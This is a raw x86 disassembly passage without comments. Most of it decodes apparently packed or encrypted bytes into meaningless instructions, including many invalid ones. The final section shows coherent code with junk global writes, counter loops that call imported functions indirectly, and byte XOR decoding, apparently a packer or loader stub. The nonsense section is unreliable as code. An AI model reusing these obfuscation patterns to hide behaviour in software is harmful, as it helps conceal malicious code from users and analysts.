  410a49:	test   DWORD PTR [esi],0xb0b368ba
  410a4f:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  410a51:	or     esi,DWORD PTR [edx+0x3b]
  410a54:	mov    ebx,0x624d465
  410a59:	xchg   edi,eax
  410a5a:	adc    eax,0xa7e42385
  410a5f:	mov    bh,0x6e
  410a61:	or     DWORD PTR [ebx+eiz*4],0xcf8a3552
  410a68:	(bad)  
  410a69:	cwde   
  410a6a:	rol    BYTE PTR [ebp-0x56840d6d],cl
  410a70:	pop    edx
  410a71:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410a72:	sub    al,0xb0
  410a74:	(bad)  
  410a76:	rol    BYTE PTR [esi+0x6a989b98],cl
  410a7c:	or     al,dl
  410a7e:	push   edx
  410a7f:	lods   al,BYTE PTR ds:[si]
  410a81:	cmp    ch,BYTE PTR [ecx+0x3d]
  410a84:	and    eax,DWORD PTR [esi]
  410a86:	pop    ebp
  410a87:	and    ebp,DWORD PTR [ebp+0x30]
  410a8a:	mov    dh,0x7b
  410a8c:	inc    ebp
  410a8d:	stc    
  410a8e:	cwde   
  410a8f:	mov    eax,DWORD PTR [ebx+0x63]
  410a92:	sbb    ecx,esi
  410a94:	hlt    
  410a95:	mov    edx,DWORD PTR [edx-0x2f92df67]
  410a9b:	sahf   
  410a9c:	jge    0x410a3c
  410a9e:	mov    DWORD PTR [edi],ebp
  410aa0:	pop    ecx
  410aa1:	xchg   ecx,eax
  410aa2:	sti    
  410aa3:	retf   
  410aa4:	outs   dx,BYTE PTR ds:[esi]
  410aa5:	inc    edx
  410aa6:	call   0x8eb58dd5
  410aab:	outs   dx,DWORD PTR ds:[esi]
  410aac:	fild   WORD PTR [ebx]
  410aae:	inc    edi
  410aaf:	ins    DWORD PTR es:[edi],dx
  410ab0:	rcl    dh,0xe3
  410ab3:	xchg   ecx,eax
  410ab4:	inc    ebx
  410ab5:	inc    esi
  410ab6:	push   ds
  410ab7:	pop    ds
  410ab8:	push   edx
  410ab9:	pop    esi
  410aba:	or     eax,0x2c0f1d06
  410abf:	imul   ecx,ebp,0x13
  410ac2:	test   BYTE PTR [ecx+0x7fcf0e51],0x8c
  410ac9:	push   esp
  410aca:	mov    ds:0x76f0add4,eax
  410acf:	jnp    0x410b48
  410ad1:	repnz jecxz 0x410b11
  410ad4:	pcmpgtd mm7,QWORD PTR ds:0xa22c8330
  410adb:	out    dx,al
  410adc:	and    eax,0x5896ca2f
  410ae1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410ae2:	sbb    eax,0x5d6eee2c
  410ae7:	sub    ch,bl
  410ae9:	mov    al,0x99
  410aeb:	imul   esi,DWORD PTR [edi+0x4dc41072],0x325e19c2
  410af5:	mov    ecx,esi
  410af7:	out    0x3,al
  410af9:	aaa    
  410afa:	inc    ecx
  410afb:	jbe    0x410b35
  410afd:	xchg   edx,eax
  410afe:	mov    ah,0x57
  410b00:	xchg   cl,ah
  410b02:	dec    ebx
  410b03:	xlat   BYTE PTR ds:[ebx]
  410b04:	addr16 dec ecx
  410b06:	repz fimul DWORD PTR [ecx]
  410b09:	hlt    
  410b0a:	dec    ebp
  410b0b:	mov    bh,0x19
  410b0d:	cmc    
  410b0e:	in     al,dx
  410b0f:	jno    0x410a9d
  410b11:	imul   eax,DWORD PTR [esi],0x56dfe303
  410b17:	dec    eax
  410b18:	mov    ds:0x1c73e4e3,al
  410b1d:	inc    edi
  410b1e:	jne    0x410ae6
  410b20:	xchg   edi,eax
  410b21:	fs es adc eax,0x1b3f7086
  410b28:	div    DWORD PTR [eax]
  410b2a:	dec    esi
  410b2b:	inc    ecx
  410b2c:	and    BYTE PTR [edi+eiz*4],bl
  410b2f:	lea    edx,[esi]
  410b31:	call   FWORD PTR [eax+esi*8-0x519884a9]
  410b38:	sbb    al,0x8d
  410b3a:	push   esi
  410b3b:	mov    al,0x7
  410b3d:	jnp    0x410b3c
  410b3f:	jmp    0xbea3:0x4658ca7
  410b46:	add    esp,eax
  410b48:	cwde   
  410b49:	ins    DWORD PTR es:[edi],dx
  410b4a:	xor    dl,BYTE PTR [ebx-0x1f]
  410b4d:	imul   ebp,ebp,0xffffff95
  410b50:	mov    dh,0xb0
  410b52:	fnsave [edx]
  410b54:	fs jbe 0x410bbe
  410b57:	xchg   ebx,eax
  410b58:	fwait
  410b59:	mov    edi,0x2672b77c
  410b5e:	cmp    esi,DWORD PTR [edi+0x78]
  410b61:	sbb    al,0xe4
  410b63:	pop    ss
  410b64:	(bad)  [ecx-0x7a552a0]
  410b6a:	neg    DWORD PTR [ebp+0x305602c0]
  410b70:	add    ah,BYTE PTR [ebx-0x1664602b]
  410b76:	sbb    eax,DWORD PTR [esp+eax*8-0x30518579]
  410b7d:	loope  0x410bca
  410b7f:	enter  0x5cac,0x1e
  410b83:	mov    bh,0x1e
  410b85:	fsub   st,st(6)
  410b87:	test   DWORD PTR [ebx],0x36144019
  410b8d:	pop    edi
  410b8e:	xchg   esi,eax
  410b8f:	addr16 jge 0x410bf8
  410b92:	aam    0x4e
  410b94:	mov    DWORD PTR [eax*8-0x7c554f94],edi
  410b9b:	in     eax,0xd7
  410b9d:	inc    eax
  410b9e:	pop    esi
  410b9f:	sbb    DWORD PTR [edi],eax
  410ba1:	sub    ecx,eax
  410ba3:	pop    ebx
  410ba4:	mov    al,0xba
  410ba6:	jge    0x410bfe
  410ba8:	cmp    dl,BYTE PTR [esi]
  410baa:	mov    dh,0x42
  410bac:	mov    cl,0xb4
  410bae:	popa   
  410baf:	push   ebx
  410bb0:	icebp  
  410bb1:	fnstenv [edi+ebx*2+0x7e]
  410bb5:	mov    edx,DWORD PTR [edx+0x46]
  410bb8:	fnsave [edi-0x7c]
  410bbb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410bbc:	in     eax,dx
  410bbd:	or     BYTE PTR [eax+0x59],0x3a
  410bc1:	dec    ebp
  410bc2:	(bad)  
  410bc3:	loope  0x410ba0
  410bc5:	or     DWORD PTR [ecx+eax*1],esp
  410bc8:	es sbb edi,edi
  410bcb:	jge    0x410bb4
  410bcd:	pop    ecx
  410bce:	inc    eax
  410bcf:	js     0x410c19
  410bd1:	pushf  
  410bd2:	loop   0x410bb2
  410bd4:	adc    esp,DWORD PTR [esi+0x74]
  410bd7:	out    0xeb,al
  410bd9:	and    al,0x42
  410bdb:	cmp    ah,dh
  410bdd:	dec    esp
  410bde:	in     eax,0x1c
  410be0:	outs   dx,DWORD PTR gs:[esi]
  410be2:	cmp    eax,0x753799a8
  410be7:	sub    al,dl
  410be9:	ds xchg ecx,eax
  410beb:	pushf  
  410bec:	test   BYTE PTR [esi-0x48ebcb55],dh
  410bf2:	xchg   edx,eax
  410bf3:	add    DWORD PTR [ecx-0x2a1b21cd],esp
  410bf9:	mov    cl,0xe1
  410bfb:	lods   eax,DWORD PTR ds:[esi]
  410bfc:	mov    ebp,0xdb0a4175
  410c01:	lods   al,BYTE PTR ds:[esi]
  410c02:	inc    ecx
  410c03:	imul   edx,DWORD PTR [edi-0x65e4adb5],0xffffffdf
  410c0a:	jo     0x410bc5
  410c0c:	inc    esp
  410c0d:	push   eax
  410c0e:	(bad)  
  410c0f:	cmp    DWORD PTR [esi+0x1cb4c766],esp
  410c15:	(bad)  
  410c16:	hlt    
  410c17:	adc    eax,0x1aaace2e
  410c1c:	(bad)  
  410c1e:	cmp    BYTE PTR [esi-0x74b60166],dl
  410c24:	push   eax
  410c25:	mov    esi,0xe8de0282
  410c2a:	dec    edx
  410c2b:	out    dx,eax
  410c2c:	add    DWORD PTR [esi+edx*1],edi
  410c2f:	ret    0x1b3d
  410c32:	fimul  DWORD PTR [ebp-0x7ae0d4c5]
  410c38:	mov    al,ds:0x82ee70cd
  410c3d:	sub    al,BYTE PTR [edx]
  410c3f:	ja     0x410bec
  410c41:	xchg   bl,bl
  410c43:	aas    
  410c44:	push   ss
  410c45:	dec    edi
  410c46:	repz sub ebx,ebp
  410c49:	sub    ch,ch
  410c4b:	push   edx
  410c4c:	push   esp
  410c4d:	push   0x722c5ef7
  410c52:	and    cl,BYTE PTR [ebx-0x40bd0318]
  410c58:	js     0x410c93
  410c5a:	sti    
  410c5b:	and    dh,bl
  410c5d:	test   ch,dl
  410c5f:	cmp    BYTE PTR [ecx-0x55e2b246],dh
  410c65:	inc    ecx
  410c66:	repnz (bad) 
  410c68:	cmp    DWORD PTR [ebx+0x2d],ebp
  410c6b:	out    dx,eax
  410c6c:	stos   DWORD PTR es:[edi],eax
  410c6d:	mov    DWORD PTR [ebx-0xf],0xe7440d23
  410c74:	hlt    
  410c75:	daa    
  410c76:	das    
  410c77:	xor    dl,BYTE PTR [eax]
  410c79:	test   eax,0x9285b88f
  410c7e:	mov    ebp,edx
  410c80:	jb     0x410cfe
  410c82:	aas    
  410c83:	xchg   ebx,eax
  410c84:	inc    edi
  410c85:	mov    eax,0x71a2faaf
  410c8a:	nop
  410c8b:	jo     0x410c6a
  410c8d:	and    eax,0x64999839
  410c92:	sub    BYTE PTR [edi-0x23a9f5d0],ah
  410c98:	jmp    0x198d2163
  410c9d:	push   0x2c
  410c9f:	outs   dx,BYTE PTR ds:[esi]
  410ca0:	push   ss
  410ca1:	ret    
  410ca2:	cmp    cl,0x14
  410ca5:	xor    BYTE PTR [ecx+0x77],bl
  410ca8:	push   esp
  410ca9:	int    0x15
  410cab:	xchg   esp,eax
  410cac:	ds or  ah,al
  410caf:	outs   dx,DWORD PTR ds:[esi]
  410cb0:	push   edi
  410cb1:	adc    al,0x2c
  410cb3:	call   0x56a1:0x3828e80c
  410cba:	outs   dx,DWORD PTR ds:[esi]
  410cbb:	jns    0x410cb4
  410cbd:	adc    DWORD PTR [ebx+0x5a64cae],edi
  410cc3:	mov    dh,0x9d
  410cc5:	xchg   ebx,eax
  410cc6:	(bad)  
  410cc7:	sbb    ah,BYTE PTR gs:[edx+0x9]
  410ccb:	sbb    BYTE PTR [edi-0x172ed34e],ch
  410cd1:	inc    esp
  410cd2:	inc    ebx
  410cd3:	out    0x18,al
  410cd5:	jl     0x410cd3
  410cd7:	(bad)  
  410cd8:	cmp    ecx,DWORD PTR [ebp-0x39703b3d]
  410cde:	enter  0x242b,0x15
  410ce2:	pop    ebp
  410ce3:	cmp    ch,BYTE PTR ds:0x73d99efe
  410ce9:	pop    ecx
  410cea:	push   ebp
  410ceb:	(bad)  
  410cec:	fs push ds
  410cee:	icebp  
  410cef:	mov    eax,ds:0x6efedccb
  410cf4:	retf   0x966c
  410cf7:	dec    edx
  410cf8:	or     al,0xd9
  410cfa:	ffreep st(2)
  410cfc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410cfd:	jl     0x410d3d
  410cff:	aad    0xa4
  410d01:	xchg   ebx,eax
  410d02:	retf   
  410d03:	push   ss
  410d04:	jbe    0x410cbc
  410d06:	in     eax,dx
  410d07:	out    dx,al
  410d08:	mov    dl,0x95
  410d0a:	mov    ebp,0x8d4bfb8c
  410d0f:	mov    bh,0x1
  410d11:	and    eax,0x9ce056c
  410d16:	in     eax,0xfe
  410d18:	adc    eax,0xbdd41fd5
  410d1d:	(bad)  
  410d1e:	or     BYTE PTR [edx-0x33],bh
  410d21:	lds    ebp,FWORD PTR [esi+0x50]
  410d24:	jp     0x410d9c
  410d26:	js     0x410d6e
  410d28:	adc    ecx,ecx
  410d2a:	hlt    
  410d2b:	sub    DWORD PTR [esi+0x1a],esp
  410d2e:	and    ebp,DWORD PTR [esi+0x2f9cf5b]
  410d34:	pop    esp
  410d35:	loopne 0x410d01
  410d37:	cmp    cl,BYTE PTR [ebx]
  410d39:	mov    DWORD PTR [eax+edx*4+0xa],edi
  410d3d:	jmp    0x9262:0x1b869fd9
  410d44:	loopne 0x410d70
  410d46:	inc    esi
  410d47:	dec    ebx
  410d48:	push   0xffffffd0
  410d4a:	aam    0x6c
  410d4c:	popa   
  410d4d:	enter  0xfef1,0x7
  410d51:	and    al,0x3a
  410d53:	dec    ebx
  410d54:	mov    edx,eax
  410d56:	int    0xb1
  410d58:	mov    bl,0x4f
  410d5a:	mov    cl,0x35
  410d5c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410d5d:	retf   0x15a
  410d60:	test   DWORD PTR [eax+ecx*4],eax
  410d63:	jmp    0x460b:0x2e918f82
  410d6a:	add    eax,0x6f7eb04
  410d6f:	xchg   edx,eax
  410d70:	jbe    0x410cf4
  410d72:	mov    dh,0x8
  410d74:	cmp    dh,BYTE PTR [edx]
  410d76:	cld    
  410d77:	adc    eax,0xd440df5c
  410d7c:	adc    al,0x82
  410d7e:	and    BYTE PTR [eax+0x7d],ah
  410d81:	adc    bl,BYTE PTR [edi]
  410d83:	push   ecx
  410d84:	push   ecx
  410d85:	jbe    0x410d7d
  410d87:	xor    ebx,esi
  410d89:	adc    eax,0xef7b5ed0
  410d8e:	xor    DWORD PTR [eax+eiz*4-0x3ab97305],esp
  410d95:	repz rcl DWORD PTR [edi-0x4c],cl
  410d99:	push   ebp
  410d9a:	inc    edi
  410d9b:	dec    edi
  410d9c:	xchg   esi,eax
  410d9d:	test   eax,0xd9f626ed
  410da2:	mov    al,0x97
  410da4:	sub    ebx,DWORD PTR [edi]
  410da6:	cwde   
  410da7:	mov    bh,0xe4
  410da9:	inc    edi
  410daa:	xchg   esi,eax
  410dab:	pop    ds
  410dac:	into   
  410dad:	leave  
  410dae:	(bad)  
  410daf:	arpl   WORD PTR [ebp-0xb7a17ce],sp
  410db5:	jmp    0x410d7a
  410db7:	fild   WORD PTR [edx+0x77]
  410dba:	cmp    al,0xd9
  410dbc:	inc    esi
  410dbd:	scas   al,BYTE PTR es:[edi]
  410dbe:	nop
  410dbf:	mov    esi,0xc6d91996
  410dc4:	push   eax
  410dc5:	xor    BYTE PTR [ebx],dl
  410dc7:	sbb    al,0x88
  410dc9:	call   0x4ca3:0xa5084ccb
  410dd0:	mov    esp,0x7dff1eaf
  410dd6:	mov    esi,0xba7e9c10
  410ddb:	push   ecx
  410ddc:	outs   dx,DWORD PTR ds:[esi]
  410ddd:	cmp    dl,ah
  410ddf:	outs   dx,BYTE PTR ds:[esi]
  410de0:	jecxz  0x410e0a
  410de2:	imul   dh
  410de4:	stos   DWORD PTR es:[edi],eax
  410de5:	mov    esi,0x6be3af9e
  410dea:	adc    cl,BYTE PTR [ecx+ebx*4-0x4b]
  410dee:	imul   ebx,DWORD PTR [edx-0x25550af5],0x92edfe23
  410df8:	xchg   ah,ah
  410dfa:	sbb    DWORD PTR [esi],edi
  410dfc:	mov    bl,0xae
  410dfe:	adc    eax,0x9567ede6
  410e03:	or     dh,dl
  410e05:	stos   DWORD PTR es:[edi],eax
  410e06:	sbb    BYTE PTR [ecx-0x1a66a488],dh
  410e0c:	pop    edx
  410e0d:	stos   DWORD PTR es:[edi],eax
  410e0e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410e0f:	adc    BYTE PTR [eax+0x6e],ch
  410e12:	pop    ss
  410e13:	lds    edi,FWORD PTR [esi]
  410e15:	call   0x7c25dff1
  410e1a:	sub    al,0xc1
  410e1c:	mov    BYTE PTR [ebx],0x58
  410e1f:	adc    al,0x6
  410e21:	and    eax,0xbf5a1683
  410e26:	cmp    eax,0xeed4045c
  410e2b:	cmp    DWORD PTR [ecx],esp
  410e2d:	mov    eax,ds:0x505b5c5e
  410e32:	out    dx,al
  410e33:	stc    
  410e34:	xchg   ecx,eax
  410e35:	stos   DWORD PTR es:[edi],eax
  410e36:	jecxz  0x410e67
  410e38:	popf   
  410e39:	pushf  
  410e3a:	not    esi
  410e3c:	test   al,0xe9
  410e3e:	jge    0x410e23
  410e40:	leave  
  410e41:	cld    
  410e42:	call   0x253401b3
  410e47:	xchg   edx,eax
  410e48:	out    dx,eax
  410e49:	jb     0x410e49
  410e4b:	mov    ah,dl
  410e4d:	add    BYTE PTR [eax+edx*8],cl
  410e50:	stos   DWORD PTR es:[edi],eax
  410e51:	push   ebx
  410e52:	bound  ecx,QWORD PTR [eax]
  410e54:	pop    ds
  410e55:	out    dx,eax
  410e56:	cwde   
  410e57:	jmp    0xb261:0x83b85c90
  410e5e:	cmp    eax,0x78f2d48b
  410e63:	pop    ebx
  410e64:	xlat   BYTE PTR ds:[ebx]
  410e65:	jl     0x410e85
  410e67:	pop    edx
  410e68:	aaa    
  410e69:	(bad)  
  410e6a:	in     al,dx
  410e6b:	pop    eax
  410e6c:	mov    bh,0x7
  410e6f:	iret   
  410e70:	push   0x1af627a2
  410e75:	cmp    esi,DWORD PTR [ecx]
  410e77:	adc    eax,0xcd469d80
  410e7c:	int    0xdd
  410e7e:	xor    bl,BYTE PTR [esi-0x2e]
  410e81:	dec    eax
  410e82:	fs xor ebx,edi
  410e85:	sub    ecx,DWORD PTR [edi]
  410e87:	mov    dh,0x64
  410e89:	mov    bh,0x98
  410e8b:	xor    dl,bh
  410e8d:	mov    ch,0x9c
  410e8f:	leave  
  410e90:	fsubr  st(3),st
  410e92:	mov    dl,0x2
  410e94:	dec    ebp
  410e95:	std    
  410e96:	aas    
  410e97:	mov    ah,0x2c
  410e99:	push   ds
  410e9a:	adc    ebp,DWORD PTR [eax]
  410e9c:	(bad)  
  410e9d:	mov    al,ds:0xc6b80de7
  410ea2:	iret   
  410ea3:	out    0x1d,eax
  410ea5:	and    al,0x39
  410ea7:	or     eax,0x8c535548
  410eac:	fisttp DWORD PTR [eax-0xb00493f]
  410eb2:	dec    ecx
  410eb3:	lock test eax,0xc6820e41
  410eb9:	in     eax,dx
  410eba:	enter  0x363e,0x1f
  410ebe:	jecxz  0x410ed0
  410ec0:	push   ebx
  410ec1:	fnstsw WORD PTR [ebx]
  410ec3:	mov    ebx,0x5dfab95f
  410ec8:	scas   al,BYTE PTR es:[edi]
  410ec9:	lods   eax,DWORD PTR ds:[esi]
  410eca:	fnstsw WORD PTR [ecx+0x681eb97]
  410ed0:	sbb    BYTE PTR [eax-0x7d],bh
  410ed3:	adc    DWORD PTR [edi-0x80],esp
  410ed6:	call   0x3aa4:0xa6227483
  410edd:	mov    ?,WORD PTR [ecx+edx*4]
  410ee0:	test   BYTE PTR [ebx],0x79
  410ee3:	add    BYTE PTR [ecx-0x1f],0x94
  410ee7:	mov    BYTE PTR [edi],0x28
  410eea:	xor    al,0x63
  410eec:	adc    cl,BYTE PTR [edx]
  410eee:	jo     0x410eb0
  410ef0:	xchg   BYTE PTR [ebx],bl
  410ef2:	xor    eax,0x41198b69
  410ef7:	iret   
  410ef8:	pusha  
  410ef9:	sub    DWORD PTR [ebx-0x5fb09298],eax
  410eff:	add    DWORD PTR [edx],eax
  410f01:	loopne 0x410f3b
  410f03:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410f04:	push   ecx
  410f05:	jae    0x410f3c
  410f07:	cmc    
  410f08:	sbb    eax,0x62677012
  410f0d:	push   ecx
  410f0e:	into   
  410f0f:	jl     0x410ec7
  410f11:	lock aaa 
  410f13:	neg    bl
  410f15:	dec    esi
  410f16:	leave  
  410f17:	mov    edi,DWORD PTR [edx]
  410f19:	pop    ecx
  410f1a:	(bad)  
  410f1b:	adc    bl,BYTE PTR [bp+si]
  410f1e:	cmp    esp,DWORD PTR [edi+ecx*8]
  410f21:	xchg   DWORD PTR [esi],ebp
  410f23:	adc    eax,0xd4e8890e
  410f29:	inc    eax
  410f2a:	js     0x410ee7
  410f2c:	sub    ebx,DWORD PTR [eax]
  410f2e:	in     al,0xd2
  410f30:	dec    eax
  410f31:	cwde   
  410f32:	(bad)  
  410f33:	dec    ebp
  410f34:	jmp    0x410edf
  410f36:	popf   
  410f37:	je     0x410efe
  410f39:	add    ebx,ebp
  410f3b:	push   0xefba1c53
  410f40:	push   edx
  410f41:	imul   ebx,DWORD PTR [edx+0x2455f79f],0x22
  410f48:	mov    eax,ds:0x35f949f
  410f4d:	mov    esp,0x69530adc
  410f52:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410f53:	sbb    al,0x77
  410f55:	cmp    dh,BYTE PTR [edi+edx*2+0x279f1967]
  410f5c:	xlat   BYTE PTR ds:[ebx]
  410f5d:	dec    DWORD PTR [edi]
  410f5f:	dec    edi
  410f60:	push   ebp
  410f61:	jnp    0x410f47
  410f63:	pop    edx
  410f64:	inc    ebx
  410f65:	xchg   ecx,eax
  410f66:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410f67:	add    ebp,DWORD PTR [ecx-0x3313169c]
  410f6d:	inc    edi
  410f6e:	sub    dh,cl
  410f70:	push   esi
  410f71:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410f72:	cmp    DWORD PTR [esi-0x4cb07662],edx
  410f78:	ds scas al,BYTE PTR es:[edi]
  410f7a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410f7b:	push   ebx
  410f7c:	mov    cl,0x82
  410f7e:	leave  
  410f7f:	push   es
  410f80:	inc    esi
  410f81:	out    dx,eax
  410f82:	pop    esi
  410f83:	cs mov bh,0x41
  410f86:	popf   
  410f87:	mov    edx,0x2f48ca19
  410f8c:	xchg   esp,eax
  410f8d:	and    bl,BYTE PTR [edx+0x75ae6f2b]
  410f93:	sub    DWORD PTR [edi-0x7],ebx
  410f96:	xor    eax,DWORD PTR [edx]
  410f98:	fs pop ds
  410f9a:	fsub   st(5),st
  410f9c:	jne    0x410f6c
  410f9e:	jnp    0x410f34
  410fa0:	adc    BYTE PTR [eax+esi*4+0x46],cl
  410fa4:	xor    ebp,esi
  410fa6:	fdiv   st,st(7)
  410fa8:	mov    ebx,?
  410faa:	ins    BYTE PTR es:[edi],dx
  410fab:	jae    0x411020
  410fad:	sub    eax,0x5517a2e8
  410fb2:	lds    ebp,FWORD PTR [ecx+0x3d53726b]
  410fb8:	retf   
  410fb9:	test   esp,ebx
  410fbb:	pop    ds
  410fbc:	jnp    0x41100b
  410fbe:	pop    edi
  410fbf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410fc0:	test   BYTE PTR [esp+edi*4],ch
  410fc3:	or     BYTE PTR [ebx+0x76],dl
  410fc6:	pop    esi
  410fc7:	pop    esp
  410fc8:	test   al,0xcf
  410fca:	jae    0x410f8d
  410fcc:	fpatan 
  410fce:	inc    edi
  410fcf:	and    bh,bl
  410fd1:	in     al,dx
  410fd2:	push   cs
  410fd3:	inc    esi
  410fd4:	std    
  410fd5:	xor    BYTE PTR [eax+0x69],ah
  410fd8:	cwde   
  410fd9:	scas   al,BYTE PTR es:[edi]
  410fda:	pop    ss
  410fdb:	sar    DWORD PTR [esp+eiz*8],1
  410fde:	push   cs
  410fdf:	jge    0x41101c
  410fe1:	cmp    esp,ebx
  410fe3:	dec    esi
  410fe4:	mov    bl,0xf1
  410fe6:	sub    dh,BYTE PTR [ebx+0x774dd8f6]
  410fec:	pusha  
  410fed:	push   esi
  410fee:	and    DWORD PTR [ecx],0x1a
  410ff1:	ja     0x410fc2
  410ff3:	std    
  410ff4:	push   ss
  410ff5:	inc    esp
  410ff6:	nop
  410ff7:	pop    es
  410ff8:	jbe    0x41105e
  410ffa:	adc    ecx,DWORD PTR [ebx+0x2]
  410ffd:	jne    0x411003
  410fff:	xor    al,0xe9
  411001:	lods   al,BYTE PTR ds:[esi]
  411002:	in     eax,dx
  411003:	sti    
  411004:	leave  
  411005:	jl     0x41101e
  411007:	cld    
  411008:	pop    ebp
  411009:	cli    
  41100a:	dec    edx
  41100b:	js     0x410fc2
  41100d:	cdq    
  41100e:	sahf   
  41100f:	rcl    DWORD PTR [edx-0x6a],1
  411012:	add    DWORD PTR [ebx+0x58],esp
  411015:	mov    edi,0xf33ce998
  41101a:	push   ds
  41101b:	mov    ebx,0xa2dabec5
  411020:	pop    ebx
  411021:	mov    edi,0x4d8bd307
  411026:	or     BYTE PTR [eax+0x8a8d],bh
  41102c:	xor    ax,WORD PTR [ecx+0x20]
  411030:	adc    DWORD PTR ds:0x42b000,0x1520
  41103a:	mov    ecx,0x3b51
  41103f:	or     DWORD PTR ds:0x42a008,0x52f2
  411049:	add    ax,cx
  41104c:	or     DWORD PTR ds:0x42c010,ebx
  411052:	movzx  eax,ax
  411055:	mov    DWORD PTR [ebp-0x10],eax
  411058:	xor    DWORD PTR ds:0x429020,ecx
  41105e:	mov    BYTE PTR [ebp-0x1],0x7d
  411062:	lea    eax,[ebp-0x1]
  411065:	and    ecx,DWORD PTR ds:0x429024
  41106b:	mov    DWORD PTR [ebp-0xc],eax
  41106e:	mov    al,BYTE PTR [ebp-0x1]
  411071:	mov    ecx,DWORD PTR [ebp-0xc]
  411074:	xor    DWORD PTR ds:0x42d014,0x42a010
  41107e:	xor    al,0x74
  411080:	sub    al,0x8
  411082:	add    DWORD PTR ds:0x42901c,0x5bfc
  41108c:	mov    BYTE PTR [ecx],al
  41108e:	mov    DWORD PTR [ebp-0x18],0xf89c8585
  411095:	and    DWORD PTR ds:0x42d004,0x0
  41109f:	jmp    0x4110b3
  4110a4:	xor    ecx,ecx
  4110a6:	add    ecx,DWORD PTR ds:0x42d004
  4110ac:	inc    ecx
  4110ad:	mov    DWORD PTR ds:0x42d004,ecx
  4110b3:	cmp    DWORD PTR ds:0x42d004,0x1a
  4110ba:	jae    0x4110fe
  4110c0:	cmp    DWORD PTR ds:0x42d004,0x5
  4110c7:	jne    0x4110d3
  4110cd:	call   DWORD PTR ds:0x42e8f3
  4110d3:	cmp    DWORD PTR ds:0x42d004,0x4
  4110da:	jne    0x4110ef
  4110e0:	xor    ecx,ecx
  4110e2:	xor    ecx,DWORD PTR ds:0x42d004
  4110e8:	inc    ecx
  4110e9:	mov    DWORD PTR ds:0x42d004,ecx
  4110ef:	jmp    0x4110a4
  4110f4:	mov    DWORD PTR ds:0x42901c,0x6887
  4110fe:	push   ebx
  4110ff:	and    DWORD PTR ds:0x42c008,0x0
  411109:	jmp    0x411119
  41110e:	mov    eax,ds:0x42c008
  411113:	inc    eax
  411114:	mov    ds:0x42c008,eax
  411119:	cmp    DWORD PTR ds:0x42c008,0x19
  411120:	jae    0x4111a1
  411126:	cmp    DWORD PTR ds:0x42c008,0x5
  41112d:	jne    0x41113e
  411133:	push   0x42e000
  411138:	call   DWORD PTR ds:0x42e8f7
  41113e:	cmp    DWORD PTR ds:0x42c008,0x4
  411145:	jne    0x411156
  41114b:	mov    eax,ds:0x42c008
  411150:	inc    eax
  411151:	mov    ds:0x42c008,eax
  411156:	jmp    0x41110e
  41115b:	and    DWORD PTR ds:0x429024,0x0
  411165:	mov    ecx,DWORD PTR ds:0x429024
  41116b:	inc    ecx
  41116c:	mov    DWORD PTR ds:0x429024,ecx
  411172:	cmp    DWORD PTR ds:0x429024,0x21
  411179:	jne    0x411192
  41117f:	push   DWORD PTR [ebp-0x14]
  411182:	push   0x42d018
  411187:	push   0x6b2d
  41118c:	call   DWORD PTR ds:0x42e8bf
  411192:	cmp    DWORD PTR ds:0x429024,0x17
  411199:	jb     0x411165
  41119f:	xor    eax,eax
  4111a1:	mov    DWORD PTR [ebp-0x8],0xf89c8584
  4111a8:	and    DWORD PTR ds:0x42a008,0x0
  4111b2:	jmp    0x4111c5
  4111b7:	xor    eax,eax
  4111b9:	or     eax,DWORD PTR ds:0x42a008
  4111bf:	inc    eax
  4111c0:	mov    ds:0x42a008,eax
  4111c5:	cmp    DWORD PTR ds:0x42a008,0x14
  4111cc:	jae    0x41120d
  4111d2:	cmp    DWORD PTR ds:0x42a008,0x5
  4111d9:	jne    0x4111ea
  4111df:	push   0x42e067
  4111e4:	call   DWORD PTR ds:0x42e8fb
  4111ea:	cmp    DWORD PTR ds:0x42a008,0x4
  4111f1:	jne    0x411202
  4111f7:	mov    eax,ds:0x42a008
  4111fc:	inc    eax
  4111fd:	mov    ds:0x42a008,eax
  411202:	jmp    0x4111b7
  411207:	xor    DWORD PTR ds:0x42a018,edx
  41120d:	mov    ecx,DWORD PTR [ebp-0x18]
  411210:	dec    DWORD PTR ds:0x42a010
  411216:	push   esi
  411217:	mov    eax,0x751089b
  41121c:	mov    esi,DWORD PTR ds:0x41cda1
  411222:	mov    esi,DWORD PTR [esi]
  411224:	sub    DWORD PTR ds:0x429028,esi
  41122a:	xor    ecx,eax
  41122c:	inc    esi
  41122d:	mov    esi,0x3272e2
  411232:	add    DWORD PTR ds:0x42b008,0x42d010
  41123c:	push   edi
  41123d:	or     DWORD PTR ds:0x42b004,0x429028
  411247:	add    ecx,esi
  411249:	jmp    0x411277
  41124e:	mov    DWORD PTR ds:0x42c00c,0x285a
  411258:	mov    dl,BYTE PTR [ebp-0x1]
  41125b:	mov    DWORD PTR ds:0x42a00c,0x78fc
  411265:	mov    BYTE PTR [ebp+ecx*1-0x9c],dl
  41126c:	mov    DWORD PTR ds:0x429024,0x3f09
  411276:	inc    ecx
  411277:	mov    DWORD PTR ds:0x42a00c,0x5b6f
  411281:	cmp    ecx,0x40
  411284:	mov    DWORD PTR ds:0x42d01c,0x4c47
  41128e:	jb     0x41124e
  411294:	mov    edx,DWORD PTR [ebp-0x18]
  411297:	xor    edx,eax
  411299:	add    edx,esi
  41129b:	jmp    0x41130b
  4112a0:	sub    edi,ecx
  4112a2:	mov    edi,DWORD PTR [ebp+0x8]
  4112a5:	add    ecx,0x4f49
  4112ab:	mov    ecx,0x8a8d
  4112b0:	xor    cx,WORD PTR [edi+edx*4+0x2]
  4112b5:	sub    edi,DWORD PTR ds:0x42b00c
  4112bb:	mov    edi,0x3b51
  4112c0:	xor    DWORD PTR ds:0x42c01c,0x429014
  4112ca:	add    cx,di
  4112cd:	movzx  ecx,cx
  4112d0:	mov    DWORD PTR [ebp-0xc],ecx
  4112d3:	mov    ecx,DWORD PTR [ebp+0x8]
